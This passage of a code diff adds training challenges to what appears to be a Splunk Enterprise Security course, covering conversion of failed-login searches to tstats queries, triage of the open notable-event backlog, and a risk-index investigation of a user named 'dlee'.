+            ],
+            tags: ['es', 'translation', 'datamodel', 'tstats'],
+            description: 'Practice converting your existing Splunk searches to ES-optimized equivalents. This is the core skill for ES adoption.',
+            content: {
+                problem: 'Translate this standard Splunk search to an ES-optimized version using tstats and the Authentication data model:\n\nindex=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress | where count > 10 | sort -count',
+                hints: [
+                    'The Authentication data model normalizes login events',
+                    'EventCode 4625 = failed authentication = action="failure"',
+                    'TargetUserName maps to Authentication.user',
+                    'IpAddress maps to Authentication.src',
+                    'Remember to rename fields to strip the data model prefix'
+                ],
+                solution: {
+                    spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | sort -count',
+                    explanation: 'Key translations:\n• index=wineventlog EventCode=4625 → from datamodel=Authentication where Authentication.action="failure"\n• TargetUserName → Authentication.user\n• IpAddress → Authentication.src\n• stats → tstats (for accelerated data)\n\nThe tstats version will be dramatically faster on large time ranges because it queries pre-computed summaries instead of raw events.'
+                },
+                variations: [
+                    {
+                        description: 'Now add asset enrichment to see which workstations are being brute-forced:',
+                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | `get_asset(src)` | table user, src, nt_host, owner, priority, count | sort -count'
+                    },
+                    {
+                        description: 'Add time-based grouping to see the attack timeline:',
+                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by _time span=1h, Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10'
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-009',
+            title: 'Notable Event Triage Challenge',
+            type: 'challenge',
+            difficulty: 'intermediate',
+            duration: '15 min',
+            objectives: [
+                'Query and analyze notable events',
+                'Use urgency and status for prioritization',
+                'Build analyst workload reports'
+            ],
+            tags: ['es', 'notable', 'triage', 'workflow'],
+            description: 'Practice the daily SOC workflow: querying notables, understanding workload, and identifying high-priority items.',
+            content: {
+                problem: 'You\'re the shift lead and need to understand the current notable backlog. Write a query that shows: count of open notables by urgency level, with the average age in hours for each urgency level.',
+                hints: [
+                    'Use the `notable` macro to query the notable index',
+                    'Filter for open statuses: "new" or "in progress"',
+                    'Calculate age using: (now() - _time) / 3600 for hours',
+                    'Use stats to group by urgency and calculate averages'
+                ],
+                solution: {
+                    spl: '`notable` | where status IN ("new", "in progress") | eval age_hours = round((now() - _time) / 3600, 1) | stats count as open_notables, avg(age_hours) as avg_age_hours by urgency | sort -urgency',
+                    explanation: 'This gives you an instant view of the backlog:\n• How many open notables at each urgency level\n• How long they\'ve been waiting on average\n\nIf you see 50 critical notables with an average age of 12 hours, you have a problem. If you see 10 low-urgency notables averaging 48 hours, that might be acceptable.'
+                },
+                variations: [
+                    {
+                        description: 'Break down by analyst to see who\'s overloaded:',
+                        spl: '`notable` | where status IN ("new", "in progress") | stats count as assigned by owner, urgency | xyseries owner urgency assigned | fillnull value=0'
+                    },
+                    {
+                        description: 'Find notables that have been "in progress" too long (stale):',
+                        spl: '`notable` | where status="in progress" | eval age_hours = (now() - _time) / 3600 | where age_hours > 24 | table _time, rule_name, urgency, owner, age_hours | sort -age_hours'
+                    },
+                    {
+                        description: 'Show detection rule volume (which rules create the most work):',
+                        spl: '`notable` earliest=-7d | stats count by rule_name | sort -count | head 20'
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-010',
+            title: 'Building a Risk Investigation Query',
+            type: 'challenge',
+            difficulty: 'advanced',
+            duration: '20 min',
+            objectives: [
+                'Query the risk index for entity analysis',
+                'Correlate risk events with source detections',
+                'Build investigation-ready risk summaries'
+            ],
+            tags: ['es', 'rba', 'risk', 'investigation'],
+            description: 'Master the risk index queries that power RBA investigations. Build queries that tell the complete story of a high-risk entity.',
+            content: {
+                problem: 'A user "dlee" has been flagged as high-risk. Build a comprehensive risk summary that shows: total risk score, count of contributing detections, the individual detections with their scores, and the time range of suspicious activity.',
+                hints: [
+                    'Query index=risk with risk_object="dlee"',
+                    'Use stats to calculate the total and per-source breakdown',
+                    'earliest() and latest() functions can show the activity window',
+                    'values() can list all unique detection sources'
+                ],
+                solution: {
+                    spl: 'index=risk risk_object="dlee" earliest=-7d | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections, min(_time) as first_activity, max(_time) as last_activity | eval first_activity=strftime(first_activity, "%Y-%m-%d %H:%M"), last_activity=strftime(last_activity, "%Y-%m-%d %H:%M") | eval activity_window=first_activity." to ".last_activity',
+                    explanation: 'This single query provides the investigation summary:\n• total_risk: Cumulative risk score\n• detection_count: Number of different rules that triggered\n• detections: List of all contributing detection names\n• activity_window: When the suspicious activity occurred\n\nThis is your starting point for any RBA investigation - the "executive summary" before you dig into details.'
+                },
+                variations: [
+                    {
+                        description: 'Break down by day to see if activity is ongoing:',
+                        spl: 'index=risk risk_object="dlee" earliest=-7d | eval day=strftime(_time, "%Y-%m-%d") | stats sum(risk_score) as daily_risk, dc(source) as detections by day | sort day'
+                    },
+                    {
+                        description: 'Show the risk contribution from each detection:',
+                        spl: 'index=risk risk_object="dlee" earliest=-7d | stats sum(risk_score) as risk_contribution, count as events, latest(risk_message) as sample_message by source | sort -risk_contribution'
+                    },
+                    {
+                        description: 'Compare this user\'s risk to their peers (same department):',
+                        spl: 'index=risk earliest=-7d | lookup identity_lookup_expanded identity as risk_object OUTPUT bunit | where bunit="Finance" | stats sum(risk_score) as total_risk by risk_object | sort -total_risk | head 20'
+                    }
+                ]
+            }
+        }
     ]
 };
 
